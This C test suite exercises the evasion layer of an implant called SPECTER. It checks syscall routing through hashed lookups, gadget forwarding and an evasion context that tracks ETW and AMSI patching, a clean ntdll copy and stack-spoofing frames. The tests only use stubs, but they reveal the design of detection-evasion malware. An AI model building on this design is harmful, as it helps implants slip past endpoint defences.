/**
 * SPECTER Implant — Evasion Core Test Suite
 *
 * Tests evasion_init, evasion_syscall routing, fallback behavior
 * when evasion context is NULL or uninitialized, and argument
 * forwarding through the evasion layer.
 *
 * Build (native, not PIC):
 *   gcc -o test_evasion_core test_evasion_core.c \
 *       ../core/src/evasion/evasion_core.c \
 *       ../core/src/evasion/stackspoof.c \
 *       -I../core/include -DTEST_BUILD
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* ------------------------------------------------------------------ */
/* Type stubs (no windows.h)                                           */
/* ------------------------------------------------------------------ */

typedef unsigned char       BYTE;
typedef unsigned short      WORD;
typedef unsigned short      USHORT;
typedef unsigned int        DWORD;
typedef unsigned long long  QWORD;
typedef unsigned long long  ULONG_PTR;
typedef unsigned long long  SIZE_T;
typedef long                LONG;
typedef long                NTSTATUS;
typedef int                 BOOL;
typedef unsigned int        ULONG;
typedef short               SHORT;
typedef unsigned short      WCHAR;
typedef char                CHAR;
typedef unsigned char       UCHAR;
typedef void                VOID;
typedef void*               PVOID;
typedef void*               HANDLE;
typedef BYTE*               PBYTE;
typedef DWORD*              PDWORD;
typedef ULONG*              PULONG;
typedef SIZE_T*             PSIZE_T;
typedef WCHAR*              PWCHAR;
typedef const char*         PCSTR;
typedef const WCHAR*        PCWSTR;
typedef LONG*               PLONG;
typedef void**              PHANDLE;

#define TRUE  1
#define FALSE 0
#ifndef NULL
#define NULL ((void*)0)
#endif
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#define STATUS_SUCCESS              ((NTSTATUS)0x00000000)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001)
#define STATUS_INVALID_PARAMETER    ((NTSTATUS)0xC000000D)
#define STATUS_PROCEDURE_NOT_FOUND  ((NTSTATUS)0xC000007A)
#define INVALID_HANDLE_VALUE ((HANDLE)(ULONG_PTR)-1)

#define PAGE_READWRITE          0x04
#define PAGE_EXECUTE_READ       0x20
#define PAGE_GUARD              0x100

/* Stub PE structures */
typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWCHAR Buffer; } UNICODE_STRING, *PUNICODE_STRING;
typedef struct _LIST_ENTRY { struct _LIST_ENTRY *Flink, *Blink; } LIST_ENTRY, *PLIST_ENTRY;
typedef struct _LDR_DATA_TABLE_ENTRY { LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; PVOID DllBase; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; USHORT LoadCount; USHORT TlsIndex; LIST_ENTRY HashLinks; ULONG TimeDateStamp; } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
typedef struct _PEB_LDR_DATA { ULONG Length; BOOL Initialized; PVOID SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA;
typedef struct _PEB { BYTE InheritedAddressSpace; BYTE ReadImageFileExecOptions; BYTE BeingDebugged; BYTE BitField; BYTE Padding0[4]; PVOID Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA Ldr; } PEB, *PPEB;
typedef struct _IMAGE_DOS_HEADER { WORD e_magic; WORD e_cblp; WORD e_cp; WORD e_crlc; WORD e_cparhdr; WORD e_minalloc; WORD e_maxalloc; WORD e_ss; WORD e_sp; WORD e_csum; WORD e_ip; WORD e_cs; WORD e_lfarlc; WORD e_ovno; WORD e_res[4]; WORD e_oemid; WORD e_oeminfo; WORD e_res2[10]; LONG e_lfanew; } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
typedef struct _IMAGE_FILE_HEADER { WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics; } IMAGE_FILE_HEADER;
typedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY;
#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16
#define IMAGE_DIRECTORY_ENTRY_EXPORT 0
typedef struct _IMAGE_OPTIONAL_HEADER64 { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; QWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; QWORD SizeOfStackReserve; QWORD SizeOfStackCommit; QWORD SizeOfHeapReserve; QWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER64;
typedef struct _IMAGE_NT_HEADERS64 { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader; } IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;
typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; DWORD AddressOfNames; DWORD AddressOfNameOrdinals; } IMAGE_EXPORT_DIRECTORY;
typedef struct _IMAGE_SECTION_HEADER { BYTE Name[8]; DWORD VirtualSize; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER;

typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
typedef struct _IO_STATUS_BLOCK { union { NTSTATUS Status; PVOID Pointer; }; ULONG_PTR Information; } IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, *PCLIENT_ID;
typedef union _LARGE_INTEGER { struct { DWORD LowPart; LONG HighPart; }; long long QuadPart; } LARGE_INTEGER, *PLARGE_INTEGER;
typedef struct _MEMORY_BASIC_INFORMATION { PVOID BaseAddress; PVOID AllocationBase; DWORD AllocationProtect; WORD PartitionId; WORD Padding; SIZE_T RegionSize; DWORD State; DWORD Protect; DWORD Type; } MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;
typedef enum _PROCESSINFOCLASS { ProcessBasicInformation = 0, ProcessDebugPort = 7, ProcessWow64Information = 26, ProcessImageFileName = 27, ProcessBreakOnTermination = 29 } PROCESSINFOCLASS;
typedef enum _SECTION_INHERIT { ViewShare = 1, ViewUnmap = 2 } SECTION_INHERIT;

typedef struct _SYSCALL_ENTRY { DWORD ssn; PVOID syscall_addr; DWORD hash; } SYSCALL_ENTRY;
typedef struct _SYSCALL_TABLE { SYSCALL_ENTRY entries[50]; DWORD count; PVOID clean_ntdll; } SYSCALL_TABLE;
typedef struct _IMPLANT_CONTEXT { SYSCALL_TABLE *syscall_table; PVOID clean_ntdll; PVOID config; PVOID comms_ctx; PVOID sleep_ctx; PVOID evasion_ctx; PVOID module_bus; BOOL running; } IMPLANT_CONTEXT;

IMPLANT_CONTEXT g_ctx;

/* String/memory stubs using libc */
SIZE_T spec_strlen(const char *s) { return strlen(s); }
SIZE_T spec_wcslen(const WCHAR *s) { SIZE_T n=0; while(s[n]) n++; return n; }
int spec_strcmp(const char *a, const char *b) { return strcmp(a,b); }
int spec_wcsicmp(const WCHAR *a, const WCHAR *b) { (void)a; (void)b; return 0; }
void *spec_memcpy(void *d, const void *s, SIZE_T n) { return memcpy(d,s,n); }
void *spec_memmove(void *d, const void *s, SIZE_T n) { return memmove(d,s,n); }
void *spec_memset(void *d, int c, SIZE_T n) { return memset(d,c,n); }
int spec_memcmp(const void *a, const void *b, SIZE_T n) { return memcmp(a,b,n); }
char *spec_strcpy(char *d, const char *s) { return strcpy(d,s); }
char *spec_strcat(char *d, const char *s) { return strcat(d,s); }
DWORD spec_djb2_hash(const char *str) { DWORD h=5381; int c; while((c=*str++)){if(c>='A'&&c<='Z')c+=0x20;h=((h<<5)+h)+c;} return h; }
DWORD spec_djb2_hash_w(const WCHAR *str) { (void)str; return 0; }
PPEB get_peb(void) { return NULL; }
PVOID find_module_by_hash(DWORD h) { (void)h; return NULL; }
PVOID find_export_by_hash(PVOID m, DWORD h) { (void)m; (void)h; return NULL; }
PVOID resolve_function(DWORD mh, DWORD fh) { (void)mh; (void)fh; return NULL; }

/* ------------------------------------------------------------------ */
/* Syscall tracking stubs                                              */
/* ------------------------------------------------------------------ */

/* Track the last spec_syscall invocation for test verification */
static DWORD  last_ssn = 0;
static PVOID  last_addr = NULL;
static QWORD  last_args[12];
static int    syscall_call_count = 0;

NTSTATUS spec_syscall(DWORD ssn, PVOID addr, ...) {
    last_ssn = ssn;
    last_addr = addr;
    syscall_call_count++;

    /* Extract args for verification */
    typedef __builtin_va_list va_list;
    va_list ap;
    __builtin_va_start(ap, addr);
    for (int i = 0; i < 12; i++)
        last_args[i] = __builtin_va_arg(ap, QWORD);
    __builtin_va_end(ap);

    return STATUS_SUCCESS;
}

SYSCALL_TABLE g_syscall_table;

SYSCALL_ENTRY *sc_get_entry(SYSCALL_TABLE *t, DWORD h) {
    if (!t) return NULL;
    for (DWORD i = 0; i < t->count; i++) {
        if (t->entries[i].hash == h)
            return &t->entries[i];
    }
    return NULL;
}

/* Stub for CRC table init (tested separately) */
NTSTATUS evasion_init_crc_table(void *ctx) {
    (void)ctx;
    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/* Include evasion types inline                                        */
/* ------------------------------------------------------------------ */

#define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3

typedef struct _RUNTIME_FUNCTION {
    DWORD BeginAddress;
    DWORD EndAddress;
    DWORD UnwindInfoAddress;
} RUNTIME_FUNCTION, *PRUNTIME_FUNCTION;

#define HASH_USER32_DLL     0x5E5AB823
#define HASH_RPCRT4_DLL     0xBB09A486
#define HASH_COMBASE_DLL    0xBC8E54C5
#define HASH_RTLUSERTHREADSTART     0xA2E74681
#define HASH_BASETHREADINITTHUNK    0xD83D6AA1
#define HASH_KERNEL32_DLL   0x7040EE75
#define HASH_NTDLL_DLL      0x22D3B5ED

#define FRAME_MAX_ENTRIES   256
#define FRAME_CHAIN_MAX     8
#define SAVED_FRAMES_MAX    16

typedef struct _FRAME_ENTRY {
    PVOID  code_start;
    PVOID  code_end;
    PVOID  unwind_info;
    DWORD  module_hash;
} FRAME_ENTRY;

typedef struct _FRAME_LIBRARY {
    FRAME_ENTRY entries[FRAME_MAX_ENTRIES];
    DWORD       count;
    DWORD       max_capacity;
} FRAME_LIBRARY;

typedef struct _SAVED_STACK_FRAMES {
    QWORD  original_rsp;
    QWORD  saved_return_addrs[SAVED_FRAMES_MAX];
    QWORD  saved_rbp_chain[SAVED_FRAMES_MAX];
    DWORD  frame_count;
} SAVED_STACK_FRAMES;

#define CRC_TABLE_CAPACITY  64
#define CRC_CHECK_BYTES     32

typedef struct _CRC_ENTRY {
    DWORD func_hash;
    DWORD crc_value;
    PVOID func_addr;
} CRC_ENTRY;

typedef struct _CRC_TABLE {
    CRC_ENTRY entries[CRC_TABLE_CAPACITY];
    DWORD     count;
} CRC_TABLE;

typedef struct _EVASION_CONTEXT {
    FRAME_LIBRARY  frame_lib;
    PVOID          clean_ntdll;
    CRC_TABLE      crc_table;
    BOOL           etw_patched;
    BOOL           amsi_patched;
    BYTE           etw_original[8];
    BYTE           amsi_original[8];
    PVOID          etw_patch_addr;
    PVOID          amsi_patch_addr;
    DWORD          prng_state;
} EVASION_CONTEXT;

/* Declarations from evasion_core.c and stackspoof.c */
NTSTATUS evasion_init(IMPLANT_CONTEXT *ctx);
NTSTATUS evasion_syscall(EVASION_CONTEXT *ctx, DWORD func_hash, ...);
NTSTATUS evasion_init_frames(EVASION_CONTEXT *ctx);
DWORD evasion_select_frames(EVASION_CONTEXT *ctx, DWORD target_func_hash,
                            FRAME_ENTRY **chain_out, DWORD count);
NTSTATUS evasion_build_spoofed_stack(FRAME_ENTRY **chain, DWORD count,
                                     QWORD original_rsp,
                                     SAVED_STACK_FRAMES *saved);
void evasion_restore_stack(SAVED_STACK_FRAMES *saved);
void evasion_test_set_prng_seed(EVASION_CONTEXT *ctx, DWORD seed);

/* ------------------------------------------------------------------ */
/*  Test framework                                                     */
/* ------------------------------------------------------------------ */

static int tests_run = 0;
static int tests_passed = 0;

#define ASSERT(cond, msg) do { \
    tests_run++; \
    if (!(cond)) { \
        printf("  FAIL: %s (line %d)\n", msg, __LINE__); \
    } else { \
        tests_passed++; \
    } \
} while(0)

/* ------------------------------------------------------------------ */
/*  Helper: set up syscall table with test entries                     */
/* ------------------------------------------------------------------ */

static BYTE fake_gadget[] = { 0x0F, 0x05, 0xC3 }; /* syscall; ret */

#define TEST_HASH_A 0xC66D2FCC  /* NtAllocateVirtualMemory */
#define TEST_HASH_B 0x2D18BB7D  /* NtClose */
#define TEST_SSN_A  0x18
#define TEST_SSN_B  0x0F

static void setup_syscall_table(void) {
    memset(&g_syscall_table, 0, sizeof(g_syscall_table));
    g_syscall_table.entries[0].hash = TEST_HASH_A;
    g_syscall_table.entries[0].ssn = TEST_SSN_A;
    g_syscall_table.entries[0].syscall_addr = &fake_gadget[0];
    g_syscall_table.entries[1].hash = TEST_HASH_B;
    g_syscall_table.entries[1].ssn = TEST_SSN_B;
    g_syscall_table.entries[1].syscall_addr = &fake_gadget[0];
    g_syscall_table.count = 2;
}

static void reset_tracking(void) {
    last_ssn = 0;
    last_addr = NULL;
    memset(last_args, 0, sizeof(last_args));
    syscall_call_count = 0;
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_init with NULL context                               */
/* ------------------------------------------------------------------ */

static void test_evasion_init_null(void) {
    printf("[test_evasion_init_null]\n");

    NTSTATUS status = evasion_init(NULL);
    ASSERT(status == STATUS_INVALID_PARAMETER, "NULL ctx returns invalid param");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_init sets evasion_ctx pointer                        */
/* ------------------------------------------------------------------ */

static void test_evasion_init_sets_ctx(void) {
    printf("[test_evasion_init_sets_ctx]\n");

    IMPLANT_CONTEXT ictx;
    memset(&ictx, 0, sizeof(ictx));
    setup_syscall_table();
    ictx.syscall_table = &g_syscall_table;
    ictx.clean_ntdll = (PVOID)0x1000;

    NTSTATUS status = evasion_init(&ictx);
    /* Will fail because PEB stubs return NULL, but should still set
       the evasion_ctx pointer (evasion_init_frames failure is handled) */
    (void)status;

    ASSERT(ictx.evasion_ctx != NULL, "evasion_ctx pointer is set");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_syscall with NULL ctx falls through to raw syscall   */
/* ------------------------------------------------------------------ */

static void test_evasion_syscall_null_ctx(void) {
    printf("[test_evasion_syscall_null_ctx]\n");

    setup_syscall_table();
    reset_tracking();

    /* NULL evasion context — should fall through to raw spec_syscall */
    NTSTATUS status = evasion_syscall(NULL, TEST_HASH_A,
        (QWORD)0x1111, (QWORD)0x2222, (QWORD)0x3333);
    ASSERT(NT_SUCCESS(status), "syscall succeeds with NULL ctx");
    ASSERT(last_ssn == TEST_SSN_A, "correct SSN forwarded");
    ASSERT(last_addr == &fake_gadget[0], "correct gadget addr forwarded");
    ASSERT(last_args[0] == 0x1111, "arg1 forwarded correctly");
    ASSERT(last_args[1] == 0x2222, "arg2 forwarded correctly");
    ASSERT(last_args[2] == 0x3333, "arg3 forwarded correctly");
    ASSERT(syscall_call_count == 1, "spec_syscall called once");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_syscall with unknown hash returns not found          */
/* ------------------------------------------------------------------ */

static void test_evasion_syscall_unknown_hash(void) {
    printf("[test_evasion_syscall_unknown_hash]\n");

    setup_syscall_table();
    reset_tracking();

    NTSTATUS status = evasion_syscall(NULL, 0xDEADBEEF);
    ASSERT(status == STATUS_PROCEDURE_NOT_FOUND, "unknown hash returns not found");
    ASSERT(syscall_call_count == 0, "spec_syscall not called");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_syscall with empty frame library falls through      */
/* ------------------------------------------------------------------ */

static void test_evasion_syscall_empty_frames(void) {
    printf("[test_evasion_syscall_empty_frames]\n");

    setup_syscall_table();
    reset_tracking();

    /* Create evasion context with no frames */
    EVASION_CONTEXT ectx;
    memset(&ectx, 0, sizeof(ectx));

    NTSTATUS status = evasion_syscall(&ectx, TEST_HASH_B, (QWORD)0xAAAA);
    ASSERT(NT_SUCCESS(status), "syscall succeeds with empty frames");
    ASSERT(last_ssn == TEST_SSN_B, "correct SSN for NtClose");
    ASSERT(last_args[0] == 0xAAAA, "arg forwarded correctly");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: argument forwarding for many args                            */
/* ------------------------------------------------------------------ */

static void test_evasion_syscall_many_args(void) {
    printf("[test_evasion_syscall_many_args]\n");

    setup_syscall_table();
    reset_tracking();

    NTSTATUS status = evasion_syscall(NULL, TEST_HASH_A,
        (QWORD)0x10, (QWORD)0x20, (QWORD)0x30, (QWORD)0x40,
        (QWORD)0x50, (QWORD)0x60, (QWORD)0x70, (QWORD)0x80,
        (QWORD)0x90, (QWORD)0xA0, (QWORD)0xB0, (QWORD)0xC0);

    ASSERT(NT_SUCCESS(status), "syscall with 12 args succeeds");
    ASSERT(last_args[0]  == 0x10, "arg1 correct");
    ASSERT(last_args[1]  == 0x20, "arg2 correct");
    ASSERT(last_args[2]  == 0x30, "arg3 correct");
    ASSERT(last_args[3]  == 0x40, "arg4 correct");
    ASSERT(last_args[4]  == 0x50, "arg5 correct");
    ASSERT(last_args[5]  == 0x60, "arg6 correct");
    ASSERT(last_args[6]  == 0x70, "arg7 correct");
    ASSERT(last_args[7]  == 0x80, "arg8 correct");
    ASSERT(last_args[8]  == 0x90, "arg9 correct");
    ASSERT(last_args[9]  == 0xA0, "arg10 correct");
    ASSERT(last_args[10] == 0xB0, "arg11 correct");
    ASSERT(last_args[11] == 0xC0, "arg12 correct");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: multiple sequential evasion_syscalls                         */
/* ------------------------------------------------------------------ */

static void test_evasion_syscall_sequential(void) {
    printf("[test_evasion_syscall_sequential]\n");

    setup_syscall_table();
    reset_tracking();

    /* Call with hash A */
    evasion_syscall(NULL, TEST_HASH_A, (QWORD)0x100);
    ASSERT(last_ssn == TEST_SSN_A, "first call uses SSN A");
    ASSERT(syscall_call_count == 1, "call count is 1");

    /* Call with hash B */
    evasion_syscall(NULL, TEST_HASH_B, (QWORD)0x200);
    ASSERT(last_ssn == TEST_SSN_B, "second call uses SSN B");
    ASSERT(syscall_call_count == 2, "call count is 2");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: EVASION_CONTEXT structure has expected fields                */
/* ------------------------------------------------------------------ */

static void test_evasion_context_structure(void) {
    printf("[test_evasion_context_structure]\n");

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    /* Verify all fields are accessible and at expected offsets */
    ASSERT(ctx.frame_lib.count == 0, "frame_lib.count initializes to 0");
    ASSERT(ctx.clean_ntdll == NULL, "clean_ntdll initializes to NULL");
    ASSERT(ctx.crc_table.count == 0, "crc_table.count initializes to 0");
    ASSERT(ctx.etw_patched == FALSE, "etw_patched initializes to FALSE");
    ASSERT(ctx.amsi_patched == FALSE, "amsi_patched initializes to FALSE");
    ASSERT(ctx.prng_state == 0, "prng_state initializes to 0");
    ASSERT(sizeof(ctx.etw_original) == 8, "etw_original is 8 bytes");
    ASSERT(sizeof(ctx.amsi_original) == 8, "amsi_original is 8 bytes");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_init copies clean_ntdll from syscall table           */
/* ------------------------------------------------------------------ */

static void test_evasion_init_copies_ntdll(void) {
    printf("[test_evasion_init_copies_ntdll]\n");

    IMPLANT_CONTEXT ictx;
    memset(&ictx, 0, sizeof(ictx));
    setup_syscall_table();
    g_syscall_table.clean_ntdll = (PVOID)0xDEAD0000;
    ictx.syscall_table = &g_syscall_table;

    evasion_init(&ictx);

    EVASION_CONTEXT *ectx = (EVASION_CONTEXT *)ictx.evasion_ctx;
    ASSERT(ectx != NULL, "evasion_ctx set");
    ASSERT(ectx->clean_ntdll == (PVOID)0xDEAD0000,
           "clean_ntdll copied from syscall table");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Main                                                               */
/* ------------------------------------------------------------------ */

int main(void) {
    printf("=== SPECTER Evasion Core Test Suite ===\n\n");

    test_evasion_init_null();
    test_evasion_init_sets_ctx();
    test_evasion_syscall_null_ctx();
    test_evasion_syscall_unknown_hash();
    test_evasion_syscall_empty_frames();
    test_evasion_syscall_many_args();
    test_evasion_syscall_sequential();
    test_evasion_context_structure();
    test_evasion_init_copies_ntdll();

    printf("\n=== Results: %d/%d passed ===\n", tests_passed, tests_run);
    return (tests_passed == tests_run) ? 0 : 1;
}
